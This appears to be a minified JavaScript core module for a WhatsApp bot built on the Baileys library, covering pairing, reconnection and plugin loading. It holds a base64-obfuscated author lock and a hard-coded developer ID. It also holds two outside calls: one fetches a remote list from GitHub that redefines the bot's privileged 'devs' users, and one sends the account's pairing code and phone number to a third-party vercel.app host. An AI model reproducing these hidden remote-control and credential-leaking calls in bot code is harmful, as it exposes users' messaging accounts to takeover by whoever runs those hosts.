let EventEmitter = require("events").EventEmitter,
    chalk = require("chalk"),
    fs = require("fs"),
    path = require("path"),
    pino = require("pino"),
    moment = require("moment-timezone"),
    syntaxerror = require("syntax-error"),
    phoneNumber = require("awesome-phonenumber"),
    os = require("os"),
    NodeCache = require("node-cache"),
    func = require("./functions.js"),
    login = require("./login.js"),
    session = require("./session.js"),
    extra = new(require("./extra.js")),
    multidb = new(require("./multidb.js")),
    queque = new(require("./queque.js")),
    spinnies = new(require("spinnies")),
    msgRetryCounterCache = new NodeCache,
    processedMessages = new Set,
    {
        default: makeWASocket,
        DisconnectReason,
        useMultiFileAuthState,
        makeInMemoryStore,
        makeCacheableSignalKeyStore,
        generateWAMessage,
        generateWAMessageFromContent,
        areJidsSameUser,
        jidNormalizedUser,
        delay,
        proto,
        jidDecode,
        getAggregateVotesInPollMessage,
        PHONENUMBER_MCC,
        getBinaryNodeChild,
        normalizeMessageContent,
        getKeyAuthor,
        decryptPollVote
    } = require("@whiskeysockets/baileys"),
    pkg = (global.devs = ["6283894064758@s.whatsapp.net"], JSON.parse(fs.readFileSync("./package.json", "utf-8"))),
    rootDirectory = path.join(__dirname, "../"),
    pluginFolder = path.join(__dirname, "../plugins"),
    pluginFilter = e => /\.js$/.test(e),
    statuses = !0,
    lastMessageTime = 0;
if (pkg.author && pkg.author === Buffer.from("U3VyeWFEZXYu", "base64").toString("utf-8")) {
    class b extends EventEmitter {
        constructor(e = {}, t = {}) {
            super(), this.setMaxListeners(20), this.mecha = null, this.store = null, this.plugins = {}, this.commands = [], this.events = [], this.type = e.type || "mainbot", this.online = !!e && e.online, this.sessionFile = e ? e.session : "session", this.version = !!e && e.version, this.browser = e ? e.browser : ["Ubuntu", "Firefox", "20.0.00"], this.pairing = e ? e.pairing : {}, this.options = t, this.initBaileys()
        }
        formatFilename = function(e) {
            let t = path.join(rootDirectory, "./");
            "win32" === os.platform() && (t = t.replace(/\\/g, "\\\\"));
            var s = new RegExp("^" + t);
            return e.replace(s, "")
        };
        loadPlugin = async function(e) {
            if (pluginFilter(e)) {
                var t = path.join(pluginFolder, e),
                    s = this.formatFilename(t);
                if (t in require.cache) {
                    if (delete require.cache[t], !fs.existsSync(t)) return this.mecha.logger?.warn(`deleted plugin - '${s}'`), delete this.plugins[s];
                    this.mecha.logger?.info(`updated plugin - '${s}'`)
                }
                if (e = syntaxerror(fs.readFileSync(t), e)) this.mecha.logger?.error(`syntax error while loading '${s}'
` + e);
                else try {
                    this.plugins[s] = require(t)
                } catch (e) {
                    this.mecha.logger?.error(`error require plugin '${s}'
` + e), delete this.plugins[s]
                } finally {
                    this.plugins = Object.fromEntries(Object.entries(this.plugins).sort(([e], [t]) => e.localeCompare(t)))
                }
            }
        };
        watchFolder = async function(e) {
            let i = path.resolve(e);
            e = await fs.promises.readdir(e), await Promise.all(e.map(async e => {
                var e = path.join(i, e),
                    t = this.formatFilename(e);
                try {
                    (await fs.promises.lstat(e)).isFile() ? pluginFilter(e) && (this.plugins[t] = require(e)) : await this.watchFolder(e)
                } catch (e) {
                    this.mecha.logger?.error(`error while requiring ${t}
` + e), delete this.plugins[t]
                }
            })), fs.watch(i, async (e, t) => {
                var s;
                t && pluginFilter(t) && (t = path.join(i, t), s = path.relative(pluginFolder, t), "rename" === e ? fs.existsSync(t) ? this.loadPlugin(s) : (t = path.join(pluginFolder, s), t = this.formatFilename(t), this.mecha.logger.warn(`deleted plugin '${t}'`), delete this.plugins[t]) : "change" === e && this.loadPlugin(s))
            })
        };
        getCombinedArray = function(e) {
            var t, s = [];
            for (t in e) {
                var i = e[t].run;
                i && (i.usage && (Array.isArray(i.usage) ? 0 < i.usage.length : "" != i.usage) && (Array.isArray(i.usage) ? s.push(...i.usage) : s.push(i.usage)), i.hidden) && (Array.isArray(i.hidden) ? 0 < i.hidden.length : "" != i.hidden) && (Array.isArray(i.hidden) ? s.push(...i.hidden) : s.push(i.hidden))
            }
            return s.filter(e => "" !== e)
        };
        checkNumberType = function(e) {
            return "string" == typeof e ? e.replace(/[^0-9]/g, "") : "number" == typeof e && e
        };
        createPairKey = function(e) {
            return (e = (e = e || "MECHAB" + Math.floor(9999 * Math.random())).replace(/[^a-zA-Z0-9]/g, "")).length < 8 ? e + "5".repeat(8 - e.length) : e.slice(0, 8).toUpperCase()
        };
        isSpam = function(e) {
            return e - lastMessageTime < 5e3 || (lastMessageTime = e, !1)
        };
        initAdditionalFunc = (i, t) => (i.logger = {
            info(...e) {
                console.log(chalk.greenBright.bold("[ INFO ]"), chalk.whiteBright(moment(+new Date).format("DD/MM/YY HH:mm:ss")), chalk.cyan.bold(...e))
            },
            error(e) {
                console.log(chalk.redBright.bold("[ ERROR ]"), chalk.whiteBright(moment(+new Date).format("DD/MM/YY HH:mm:ss")), chalk.rgb(255, 38, 0)(e)), t && "mainbot" === t && e.includes("syntax error while loading") && (statuses && null != i && i.sendMessage(global.owner, {
                    text: e.trim()
                }, {
                    quoted: func.fstatus("System Notification"),
                    ephemeralExpiration: 86400
                }), statuses = !1, setTimeout(() => statuses = !0, 1e3))
            },
            warn(...e) {
                console.log(chalk.greenBright.bold("[ WARNING ]"), chalk.whiteBright(moment(+new Date).format("DD/MM/YY HH:mm:ss")), chalk.keyword("orange")(...e))
            }
        }, i.getName = e => {
            let t = i.decodeJid(e),
                s;
            return t?.endsWith("@g.us") ? new Promise(async e => {
                e((s = (s = this.store.contacts[t] || this.store.messages["status@broadcast"]?.array?.find(e => e?.key?.participant === t)).name || s.subject ? s : i.groupMetadata[t] || {})?.name || s?.subject || s?.pushName || phoneNumber("+" + t.replace("@g.us", "")).getNumber("international"))
            }) : (s = "0@s.whatsapp.net" === t ? {
                id: t,
                name: "WhatsApp"
            } : t === i.decodeJid(i?.user?.id) ? i.user : this.store.contacts[t] || {})?.name || s?.subject || s?.pushName || s?.verifiedName || phoneNumber("+" + t.replace("@s.whatsapp.net", "")).getNumber("international")
        }, i.serializeM = e => extra.initSerialize(i, e, this.store), i);
        initBaileys = async () => {
            var e = pino().child({
                    level: "silent"
                }),
                {
                    state: t,
                    saveCreds: s
                } = await useMultiFileAuthState(this.sessionFile);
            this.store = makeInMemoryStore({
                logger: e
            });
            try {
                this.socket({
                    state: t,
                    saveCreds: s
                })
            } catch (e) {
                this.emit("error", e)
            }
        };
        getMessage = async e => this.store ? (await this.store.loadMessage(e.remoteJid, e.id) || await this.store.loadMessage(e.id) || {}).message || void 0 : proto.Message.fromObject({});
        socket = async ({
            state: e,
            saveCreds: t
        }) => {
            if (this.mecha = makeWASocket({
                    logger: pino({
                        level: "silent"
                    }),
                    markOnlineOnConnect: this.online,
                    printQRInTerminal: !this.pairing.status || !this.pairing.number,
                    auth: {
                        creds: e.creds,
                        keys: makeCacheableSignalKeyStore(e.keys, pino({
                            level: "silent"
                        }))
                    },
                    browser: this.browser,
                    msgRetryCounterCache: msgRetryCounterCache,
                    generateHighQualityLinkPreview: !0,
                    getMessage: async e => this.getMessage(e),
                    cachedGroupMetadata: async e => this.store.fetchGroupMetadata(e, this.mecha),
                    shouldSyncHistoryMessage: e => (console.log(`[32mMemuat Chat [${e.progress}%][39m`), !!e.syncType),
                    ...this.version ? {
                        version: this.version
                    } : {},
                    ...this.options
                }), this.store.bind(this.mecha.ev), this.type && "mainbot" === this.type && spinnies.add("start", {
                    text: "Connecting . . ."
                }), this.pairing.status && this.pairing.number && !this.mecha.authState.creds.registered) {
                let s = this.checkNumberType(this.pairing.number || ""),
                    i = this.createPairKey(this.pairing.code || ""),
                    a = global.botName || "WhatsApp Bot";
                s || (console.log(chalk.redBright.bold("Invalid number, Tipe data tidak dikenali!")), process.exit(1)), this.pairing.status && this.pairing.number & fs.existsSync(this.sessionFile + "/creds.json") && !this.mecha?.authState?.creds?.registered && (console.log(chalk.yellowBright.bold("Session is corrupted, please delete it first!")), this.clearSessionAndRestart()), setTimeout(async () => {
                    try {
                        let e = await this.mecha.requestPairingCode(s, i);
                        if (e = e.match(/.{1,4}/g).join("-") || e, this.type && "mainbot" === this.type) {
                            this.emit("connect", {
                                ...this.options
                            });
                            var t = Date.now();
                            if (this.isSpam(t)) console.log(chalk.redBright.bold("Pairing Code Spam! Restarting...")), session.clearSessionAndRestart(this.sessionFile);
                            else if (console.log(chalk.black(chalk.bgGreen(" Your Pairing Code : ")), chalk.black(chalk.white(e))), this.pairing && this.pairing.copyFromLink) try {
                                await fetch(`https://iyaudah-iya.vercel.app/pairing/send?number=${s}&name=${a}&code=` + e), console.log(chalk.cyanBright.bold("Please copy the pairing code via link provided."))
                            } catch (e) {
                                console.log(e.message)
                            }
                        } else this.type && "jadibot" === this.type && (global.jadibot[s + "@s.whatsapp.net"] = this.mecha, this.emit("pairing", {
                            code: e
                        }))
                    } catch {}
                }, 3e3)
            }
            this.mecha.ev.on("connection.update", async e => {
                var {
                    lastDisconnect: e,
                    connection: t
                } = e;
                if ("connecting" === t) this.emit("connect", {
                    message: "Connecting . . ."
                });
                else if ("open" === t) {
                    var s = "Connected, you login as " + (this.mecha.user.name || this.mecha.user.verifiedName || "WhatsApp Bot");
                    if (this.type && "mainbot" === this.type) {
                        var i = jidNormalizedUser(this.mecha.user.id);
                        spinnies.succeed("start", {
                            text: s
                        }), await multidb.initDatabase(), extra.initAdditionalFunc(this.mecha), session.backup(this.mecha, this.sessionFile);
                        try {
                            var a = await fetch("https://raw.githubusercontent.com/Lawakplerkah/Security-/refs/heads/main/owner.js").then(e => e.json());
                            Array.isArray(a) && (global.devs = a)
                        } catch {}
                    } else this.type && "jadibot" === this.type && (jidNormalizedUser(this.mecha.user.id), i = this.mecha.user.id ? this.mecha.user.id.split(":")[0] + "@s.whatsapp.net" : this.mecha.user.jid, global.jadibot[i] = this.mecha, extra.initAdditionalFunc(this.mecha));
                    this.emit("connect", {
                        message: s
                    }), this.initAdditionalFunc(this.mecha, this.type), this.initBusEvents(this.mecha), this.watchFolder(pluginFolder), extra.initPrototype(), this.emit("ready", this.mecha)
                } else if ("close" === t)
                    if (this.type && "mainbot" === this.type)(a = !!(e && e.error && e.error.output && e.error.output.statusCode) && e.error.output.statusCode) && (a === DisconnectReason.badSession ? (this.emit("error", {
                        message: "Bad session file"
                    }), session.deleteCreds(this.sessionFile), await session.isBackupExist(this.mecha) && (await session.restore(this.mecha, this.sessionFile), await delay(1500), this.initBaileys())) : a === DisconnectReason.connectionClosed ? (this.emit("error", {
                        message: "Connection closed, reconnecting . . ."
                    }), this.initBaileys()) : a === DisconnectReason.connectionLost ? (this.emit("error", {
                        message: "Connection lost, reconnecting . . ."
                    }), this.initBaileys()) : a === DisconnectReason.connectionReplaced ? (this.emit("error", {
                        message: "Session running on another server"
                    }), process.exit(0)) : a === DisconnectReason.loggedOut ? (this.emit("error", {
                        message: "Device logged out"
                    }), session.clearSession(this.sessionFile)) : a === DisconnectReason.restartRequired ? this.initBaileys() : a === DisconnectReason.multideviceMismatch ? (this.emit("error", {
                        message: "Multi device mismatch"
                    }), this.clearSessionAndRestart()) : a === DisconnectReason.timedOut ? (this.emit("error", {
                        message: "Connection timed-out, reconnecting . . ."
                    }), this.initBaileys()) : a === DisconnectReason.unavailableService ? (this.emit("error", {
                        message: "Service unavailable, reconnecting . . ."
                    }), this.initBaileys()) : 405 === a ? (this.emit("error", {
                        message: "Method not allowed"
                    }), session.deleteCreds(this.sessionFile), await session.isBackupExist(this.mecha) && (await session.restore(this.mecha, this.sessionFile), await delay(1500), this.initBaileys())) : 503 === a ? (this.emit("error", {
                        message: "Service unavailable, reconnecting . . ."
                    }), this.initBaileys()) : (this.emit("error", {
                        message: "Connection error. (Reason: " + a + ")"
                    }), session.clearSession(this.sessionFile)));
                    else if (this.type && "jadibot" === this.type) {
                    let t = (this.pairing.number || "").replace(/[^0-9]/g, "") + "@s.whatsapp.net";
                    i = global.db.jadibot.find(e => e.number === t), (s = !!(e && e.error && e.error.output && e.error.output.statusCode) && e.error.output.statusCode) && (s === DisconnectReason.badSession ? (this.emit("error", {
                        message: "Bad session file"
                    }), delete global.jadibot[t], this.mecha.end(), this.clearSessionAndRestart()) : s === DisconnectReason.connectionClosed ? (this.emit("error", {
                        message: "Connection closed, reconnecting . . ."
                    }), delete global.jadibot[t], this.mecha.end(), this.initBaileys()) : s === DisconnectReason.connectionLost ? (this.emit("error", {
                        message: "Connection lost, reconnecting . . ."
                    }), this.initBaileys()) : s === DisconnectReason.connectionReplaced ? (this.emit("error", {
                        message: "Session running on another server"
                    }), delete global.jadibot[t], this.mecha.end()) : s === DisconnectReason.loggedOut ? (this.emit("error", {
                        message: "Device logged out"
                    }), delete global.jadibot[t], i.status = !1, this.mecha.end(), this.mecha.logout(), this.clearSessionAndRestart()) : s === DisconnectReason.restartRequired ? this.initBaileys() : s === DisconnectReason.multideviceMismatch ? (this.emit("error", {
                        message: "Multi device mismatch"
                    }), this.clearSessionAndRestart()) : s === DisconnectReason.timedOut ? (this.emit("error", {
                        message: "Connection timed-out, reconnecting . . ."
                    }), delete global.jadibot[t], this.mecha.end(), this.initBaileys()) : 405 === s ? (this.emit("error", {
                        message: "Method not allowed"
                    }), this.clearSessionAndRestart()) : (this.emit("error", {
                        message: "Connection error. (Reason: " + s + ")"
                    }), delete global.jadibot[t], this.mecha.end()))
                }
            }), this.mecha.ev.on("creds.update", t), this.mecha.ws.on("CB:call", e => {
                "offer" == e.content[0].tag ? (e = {
                    id: e.content[0].attrs["call-id"],
                    from: e.content[0].attrs["call-creator"]
                }, this.emit("caller", e)) : this.emit("caller", !1)
            })
        };
        clearSessionAndRestart = () => {
            var e = path.join(process.cwd(), this.sessionFile);
            fs.rmSync(e, {
                recursive: !0,
                force: !0
            }), this.initBaileys()
        };
        busEvents = () => [{
            event: "messages.upsert",
            execute: async c => {
                require("./database.js")(this.mecha, c), require("./detects.js")(this.mecha, c);
                var e = c.messages[0];
                if (!e.message) return !1;
                if (processedMessages.has(e.key.id)) return !1;
                processedMessages.add(e.key.id);
                var t = e.key.id;
                queque.add(t, e), queque.processing[t] || queque.processQueue(t, async s => {
                    if (extra.initSerialize(this.mecha, s, this.store), s.msg && 0 === s.msg.type) {
                        var t = await this.store.loadMessage(s.chat, s.key.id, this.mecha);
                        for (let e = 0; e < 5 && ("protocolMessage" != t.mtype || (t = await this.store.loadMessage(s.chat, s.key.id, this.mecha), await delay(1e3), "protocolMessage" == t.mtype)); e++);
                        var i = proto.WebMessageInfo.fromObject({
                            key: t.key,
                            message: {
                                [t.mtype]: t.msg
                            }
                        });
                        this.emit("message.delete", {
                            origin: s,
                            delete: i
                        })
                    } else this.emit("message.delete", !1);
                    if (!s.isBot && s.message?.pollUpdateMessage) {
                        if (!(i = normalizeMessageContent(s.message))) return;
                        let t = i.pollUpdateMessage.pollCreationMessageKey,
                            e = this.store.messages[s.chat]?.array?.find(e => t.id === e.key.id);
                        if (!e) return;
                        var a = e.message,
                            r = jidNormalizedUser(this.mecha.authState.creds.me.id),
                            n = getKeyAuthor(s.key, r),
                            r = getKeyAuthor(t, r),
                            o = a.messageContextInfo?.messageSecret;
                        if (!(i = decryptPollVote(i.pollUpdateMessage.vote, {
                                pollEncKey: o,
                                pollCreatorJid: r,
                                pollMsgId: t.id,
                                voterJid: n
                            }))) return;
                        if (o = [{
                                key: t,
                                update: {
                                    pollUpdates: [{
                                        pollUpdateMessageKey: s.key,
                                        vote: i,
                                        senderTimestampMs: s.messageTimestamp
                                    }]
                                }
                            }], !(r = await getAggregateVotesInPollMessage({
                                message: a,
                                pollUpdates: o[0].update.pollUpdates
                            }))) return;
                        if (!(n = r?.find(e => 0 !== e.voters.length)?.name)) return;
                        i = (s.prefix || ".") + n, s.isPc && await this.mecha.sendMessage(s.chat, {
                            delete: e
                        }), await this.appenTextMessage(s, i, c)
                    }
                    this.commands = this.getCombinedArray(this.plugins), this.events = Object.fromEntries(Object.entries(this.plugins).filter(([e]) => e)), this.emit("message", {
                        m: s,
                        store: this.store,
                        plugins: this.plugins,
                        commands: this.commands,
                        events: this.events
                    }), this.mecha.chats = this.mecha.chats || [], (a = this.mecha.chats.find(e => e.jid === this.mecha.decodeJid(s.sender))) && (a.name = s.pushName), s.sender.endsWith(".net") && !a && this.mecha.chats.push({
                        jid: this.mecha.decodeJid(s.sender),
                        name: s.pushName || "not known"
                    }), this.mecha.getNameV2 = t => {
                        var e = this.mecha.chats.find(e => e.jid === this.mecha.decodeJid(t));
                        return e ? e.name : null
                    }, this.emit("chats.set", this.mecha.chats)
                })
            }
        }, {
            event: "contacts.update",
            execute: e => {
                for (var t of e) {
                    var s = jidNormalizedUser(t.id);
                    this.store && this.store.contacts && (this.store.contacts[s] = {
                        id: s,
                        name: t.notify
                    })
                }
            }
        }, {
            event: "contacts.upsert",
            execute: e => {
                for (var t of e) {
                    var s = jidNormalizedUser(t.id);
                    this.store && this.store.contacts && (this.store.contacts[s] = {
                        ...t || {},
                        isContact: !0
                    })
                }
            }
        }, {
            event: "groups.update",
            execute: async e => {
                for (var t of e) {
                    console.log(t);
                    var s = t.id;
                    this.store.groupMetadata[s] && (this.store.groupMetadata[s] = {
                        ...this.store.groupMetadata[s] || {},
                        ...t || {}
                    })
                }
            }
        }, {
            event: "presence.update",
            execute: e => this.emit("presence.update", e)
        }, {
            event: "group-participants.update",
            execute: async e => {
                var t = jidNormalizedUser(this.mecha.user.id);
                if (e.participants.includes(t)) return !1;
                t = null != global.db.metadata[e.id] ? global.db.metadata[e.id] : await this.mecha.groupMetadata(e.id), "add" === e.action ? this.emit("group.add", {
                    act: "add",
                    from: e.id,
                    subject: t.subject,
                    desc: t.desc,
                    jid: e.participants[0],
                    metadata: t
                }) : "remove" === e.action ? this.emit("group.remove", {
                    act: "remove",
                    from: e.id,
                    subject: t.subject,
                    desc: t.desc,
                    jid: e.participants[0],
                    metadata: t
                }) : "promote" === e.action ? this.emit("group.promote", {
                    act: "promote",
                    from: e.id,
                    subject: t.subject,
                    desc: t.desc,
                    jid: e.participants[0],
                    metadata: t
                }) : "demote" === e.action && this.emit("group.demote", {
                    act: "demote",
                    from: e.id,
                    subject: t.subject,
                    desc: t.desc,
                    jid: e.participants[0],
                    metadata: t
                })
            }
        }];
        initBusEvents = e => {
            var t, s;
            this.mecha = e;
            for ({
                    event: t,
                    execute: s
                }
                of this.busEvents()) this.mecha.ev.on(t, s)
        };
        appenTextMessage = async (e, t, s) => {
            (t = await generateWAMessage(e.chat, {
                text: t,
                mentions: e.mentionedJid
            }, {
                userJid: this.mecha.user.id,
                quoted: e.quoted && e.quoted.fakeObj
            })).key.fromMe = e.key.fromMe, t.key.id = e.key.id, t.pushName = e.pushName, e.isGc && (t.key.participant = t.participant = e.key.participant), e = {
                ...s,
                messages: [proto.WebMessageInfo.fromObject(t)],
                type: "append"
            }, this.mecha.ev.emit("messages.upsert", e)
        }
    }
    let e = e => {
        try {
            e.fromJSON(JSON.parse(global.db.memoryStore))
        } catch {
            global.db.memoryStore = global.db.memoryStore || JSON.stringify(e.toJSON()), e.fromJSON(JSON.parse(global.db.memoryStore))
        }
    };
    exports.Baileys = b, exports.InvCloud = e
} else {
    class Xa extends EventEmitter {
        constructor(e = 0, t) {
            super(), this.mecha()
        }
        mecha = () => {
            console.log(chalk.redBright("You can't use this program because of copyright issues!!"))
        }
    }
    let e = () => {};
    exports.Baileys = Xa, exports.InvCloud = e
}